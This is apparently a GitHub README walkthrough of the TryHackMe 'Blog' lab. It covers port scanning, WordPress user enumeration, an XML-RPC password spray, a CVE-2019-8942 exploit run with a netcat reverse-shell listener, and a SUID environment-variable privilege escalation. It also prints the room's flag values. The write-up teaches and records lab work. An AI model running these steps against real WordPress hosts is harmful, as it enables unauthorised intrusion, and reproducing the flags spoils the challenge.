TryHackMe — "Blog" Machine Walkthrough

    Full Penetration Test Writeup: WordPress 5.0 RCE → Root Privilege Escalation
    Author: Nishant Saini
    Platform: TryHackMe
    Room: Blog

📖 Table of Contents

    Overview

    Target Information

    Attack Path Summary

    Full Report (PDF)

    Detailed Walkthrough

        1. Reconnaissance

        2. Enumeration

        3. Credential Access

        4. Exploitation — CVE-2019-8942 / CVE-2019-8943

        5. Privilege Escalation

        6. Flags Captured

    Tools Used

    Key Vulnerabilities

    Remediation Highlights

    Lessons Learned

    Disclaimer

    Author

🧭 Overview

This repository documents my full black-box penetration test of the Blog room on TryHackMe. The target is an Ubuntu host running a vulnerable WordPress 5.0 installation (Twenty Twenty theme) exposed via Apache, alongside SSH and Samba services.

The engagement chain follows a realistic offensive security workflow:
text

Recon → Enumeration → Credential Access → RCE (CVE-2019-8942 / CVE-2019-8943)
      → Foothold (www-data) → Privilege Escalation → Root

A full, formatted PDF report with command transcripts, screenshots, and remediation guidance is included in this repository. This README serves as a high-level summary — the PDF contains the deep technical detail.
🎯 Target Information
Field	Value
Target Hostname	blog.thm
Target IP	10.146.136.71
Platform	TryHackMe
Operating System	Ubuntu Linux
Web Stack	Apache + WordPress 5.0 (Twenty Twenty theme)
Other Services	SSH (22), Samba (139/445)
Outcome	✅ Full root compromise
Overall Risk	🔴 Critical
🛠 Attack Path Summary
Phase	Action	Result
1. Recon	nmap -sC -sV -p- full TCP scan	Found SSH, HTTP (WP 5.0), Samba
2. Enumeration	WPScan + WP-JSON REST API	Usernames: bjoel, kwheel
3. Credential Access	XML-RPC password spray via WPScan	kwheel : cutiepie1
4. Exploitation	CVE-2019-8942 crop-image shell upload	Reverse shell as www-data
5. PrivEsc	SUID /usr/sbin/checker + getenv("admin")	Root shell
6. Flags	user.txt & root.txt captured	✅ Complete
📄 Full Report (PDF)

The complete writeup is available as a PDF in this repo:

📎 WordPress_Blog_Pentest_Report_FULL.pdf

The PDF includes:

    Executive summary & scope

    Methodology and tools used

    Full attack timeline

    Complete reconnaissance & enumeration evidence

    Vulnerability analysis with CVE references

    Step-by-step exploitation walkthrough

    37 embedded screenshots

    Post-exploitation & privilege escalation

    Proof of compromise (user + root flags)

    Risk rating summary & remediation recommendations

🔍 Detailed Walkthrough
1. Reconnaissance

Started with a full TCP port scan to map the attack surface:
bash

nmap -sC -sV -p- --min-rate 5000 -T4 10.146.136.71

Discovered services:
Port	Service	Notes
22	SSH	OpenSSH
80	HTTP	WordPress 5.0
139	SMB	Samba
445	SMB	Samba

Added the virtual host to /etc/hosts:
bash

echo "10.146.136.71 blog.thm" | sudo tee -a /etc/hosts

2. Enumeration

WordPress fingerprinting confirmed the CMS and version (5.0 — vulnerable to CVE-2019-8942/8943).

Username enumeration via two vectors:

a) WP-JSON REST API:
bash

curl -s http://blog.thm/wp-json/wp/v2/users | jq

b) RSS <dc:creator> tags and WPScan:
bash

wpscan --url http://blog.thm --enumerate u

Recovered usernames:

    bjoel (Billy Joel)

    kwheel (Karen Wheeler)

3. Credential Access

Performed an XML-RPC wp.getUsersBlogs multicall password spray attack using WPScan:
bash

wpscan --url http://blog.thm \
  --usernames bjoel,kwheel \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc

✅ Valid credentials recovered:
text

kwheel : cutiepie1

4. Exploitation — CVE-2019-8942 / CVE-2019-8943

Vulnerability: WordPress Core "Crop-image Shell Upload" — allows an authenticated user (with upload permissions) to smuggle a PHP payload into the active theme directory via the image crop/customizer AJAX workflow.

Approach:

    Metasploit attempt — exploit/multi/http/wp_crop_rce module was unreliable due to Meterpreter stager failures.

    Switched to a standalone Python exploit — exploit_oscp.py (based on SpeatX/WordPress-RCE-CVE-2019-8942) paired with a plain netcat listener.

bash

# Listener
nc -lvnp 4444

# Exploit
python3 exploit_oscp.py http://blog.thm kwheel cutiepie1 10.0.0.1 4444

Result: Landed a reverse shell as www-data in /var/www/wordpress ✅
5. Privilege Escalation

Enumeration of SUID binaries:
bash

find / -perm -4000 -type f 2>/dev/null

Found a custom root-owned SUID binary:
text

/usr/sbin/checker

Behavior analysis with ltrace:
bash

ltrace /usr/sbin/checker

Discovered the binary calls getenv("admin") to gate a privileged action.

Exploitation:
bash

export admin=1
/usr/sbin/checker

This trivially bypassed the binary's "authorization" check and spawned a root shell 🎉
6. Flags Captured
Flag	Value	Location
user.txt	c8421899aae571f7af486492b71a8ab7	/media/usb/user.txt
root.txt	9a0b2b618bef9bfa7ac28c1353d9f318	/root/root.txt
🧰 Tools Used
Tool	Purpose
nmap	Port & service scanning
WPScan	WordPress enumeration, user discovery, XML-RPC brute-force
Metasploit Framework	Initial exploit attempts
Custom Python exploit (exploit_oscp.py)	CVE-2019-8942 RCE
netcat	Reverse shell listener
ltrace	SUID binary behavior analysis
curl / jq	REST API user enumeration
🚨 Key Vulnerabilities
#	Vulnerability	Severity	CVE
1	WordPress Core Crop-Image Shell Upload (RCE)	🔴 Critical	CVE-2019-8942, CVE-2019-8943
2	Weak / guessable user password (kwheel)	🟠 High	—
3	Insecure SUID binary trusting an environment variable	🔴 Critical	—
🛡 Remediation Highlights

    Patch WordPress core to a version where the crop-shell-upload flaw is fixed (5.0.x+)

    Enforce strong password policies and rate-limit / disable XML-RPC where not needed

    Never gate privileged actions in a SUID binary on untrusted environment variables — use proper authentication/authorization checks

    Disable or restrict REST API user enumeration endpoints (/wp-json/wp/v2/users)

    Apply least-privilege principles to service accounts (www-data)

    Remove unnecessary SUID binaries and audit all root-owned executables

🎓 Lessons Learned

    Version fingerprinting is critical — a known WP core version immediately opens a CVE path.

    XML-RPC is a credential-access goldmine when enabled and unthrottled.

    Metasploit isn't always reliable — knowing how to run a standalone exploit is a vital skill.

    ltrace is underrated for reverse-engineering suspicious SUID binaries.

    Environment variables are not security controls — this is a classic anti-pattern.
<img width="1920" height="1080" alt="Screenshot_2026-10-08_09_56_29" src="https://github.com/user-attachments/assets/0f6e7d3a-e426-4d9b-b88a-3be43305859b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_27_56" src="https://github.com/user-attachments/assets/e69542a9-1c4a-4900-9d5d-7773c397070b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_35_36" src="https://github.com/user-attachments/assets/02e66674-5928-49c5-bf78-23d6fa99e971" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_37_28" src="https://github.com/user-attachments/assets/dc21dbdb-53f5-419d-9361-58905a0acdf9" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_37_49" src="https://github.com/user-attachments/assets/30827ec4-619e-49b4-86d0-676817a9864f" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_39_26" src="https://github.com/user-attachments/assets/e52d1e34-06a9-4d3a-8561-1fa3fb61dc36" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_41_08" src="https://github.com/user-attachments/assets/ace5333e-4545-41dc-83f1-b3ed5585bcb2" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_44_51" src="https://github.com/user-attachments/assets/8a723a6e-bb90-4463-aa1a-6e6d946e6ac6" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_10_59_33" src="https://github.com/user-attachments/assets/466e581c-c7eb-40a3-a3a2-f21198ef65f6" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_22_11" src="https://github.com/user-attachments/assets/f94d2da5-163f-49ce-94c4-42a7b021f23b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_22_26" src="https://github.com/user-attachments/assets/a89dc6ed-d254-4945-a622-45e12fddcaa3" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_23_04" src="https://github.com/user-attachments/assets/5e53d499-a82e-4cc9-807e-5b8286c222a3" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_23_13" src="https://github.com/user-attachments/assets/1dd9779a-7a96-4ef7-8993-d34e95977147" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_29_18" src="https://github.com/user-attachments/assets/6970a7ad-76af-45d9-97ed-fddfad9d77bd" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_29_50" src="https://github.com/user-attachments/assets/f8397761-8932-4d4c-9ef2-87c0aabc0a93" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_50_02" src="https://github.com/user-attachments/assets/8377ca2c-c837-4898-9489-fa403cc08299" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_50_06" src="https://github.com/user-attachments/assets/65d874cc-6a87-4643-a5d6-c5ae922bb830" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_55_22" src="https://github.com/user-attachments/assets/2eeac974-c975-4a36-8e25-d05906f1898c" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_11_55_58" src="https://github.com/user-attachments/assets/efa04139-a2db-4f32-ad97-5999c5bd7afd" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_12_13_13" src="https://github.com/user-attachments/assets/c59db579-bdb6-4d47-82a4-d2c7832c3ce7" />
<img width="1920" height="1080" alt="Screenshot_2026-10-08_13_06_19" src="https://github.com/user-attachments/assets/32a0979d-3b98-445a-bfdd-29f3b8e88f9b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_21_15_41" src="https://github.com/user-attachments/assets/e0ecb79e-5674-47c6-85fd-102b2456bd31" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_23_09_31" src="https://github.com/user-attachments/assets/b85a2a20-75c8-40c7-943a-584b42127bf2" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_23_37_52" src="https://github.com/user-attachments/assets/7c21b87e-5e18-4199-a9a7-1b8f1f6d62ff" />
<img width="1920" height="1080" alt="Screenshot_2026-10-09_23_41_06" src="https://github.com/user-attachments/assets/82b12b71-6755-4c1f-b6a6-63323d525be9" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_00_51" src="https://github.com/user-attachments/assets/519a7794-82dd-4369-98c3-16a524c51c21" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_07_05" src="https://github.com/user-attachments/assets/314b4d3f-b9f7-4c73-bbef-a0600cd20a1a" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_11_20" src="https://github.com/user-attachments/assets/fbedd96e-0f3a-400e-a62f-61a85eec7d0c" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_19_24" src="https://github.com/user-attachments/assets/596b5228-e6e0-479f-96c0-ce92560abb3e" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_21_36" src="https://github.com/user-attachments/assets/7fb33f5a-0651-4eb6-a850-58fd1748d0ec" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_23_08" src="https://github.com/user-attachments/assets/09c3d901-7dac-4ffc-a124-a081a5fd9ed3" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_23_45" src="https://github.com/user-attachments/assets/12c0d6e0-f784-43d8-8a45-cb7a850fea8e" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_24_12" src="https://github.com/user-attachments/assets/57c24369-fb8c-4314-b507-76408f0e4ee4" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_27_41" src="https://github.com/user-attachments/assets/f78c6313-8957-41b2-844f-befce16b00bb" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_28_15" src="https://github.com/user-attachments/assets/4c7933b3-e353-418b-8102-936369e1fe88" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_29_17" src="https://github.com/user-attachments/assets/ec0da208-d042-4743-b5e1-75eac34f3569" />
<img width="1920" height="1080" alt="Screenshot_2026-10-10_01_30_19" src="https://github.com/user-attachments/assets/899523fe-c59c-43d2-b8b9-3805ee043839" />

    

⚠️ Disclaimer

This engagement was carried out entirely within an isolated, sanctioned TryHackMe lab environment for educational purposes. None of the techniques, exploits, or findings documented here were used against systems without authorization. This writeup is intended to demonstrate offensive security methodology and is shared for learning purposes only.

Do not use these techniques against systems you do not own or have explicit written permission to test.
👤 Author

Nishant Saini

If you found this writeup useful, feel free to ⭐ star this repo — it helps others find it!
<p align="center"> <i>Happy hacking — ethically. 🐱‍💻</i> </p>
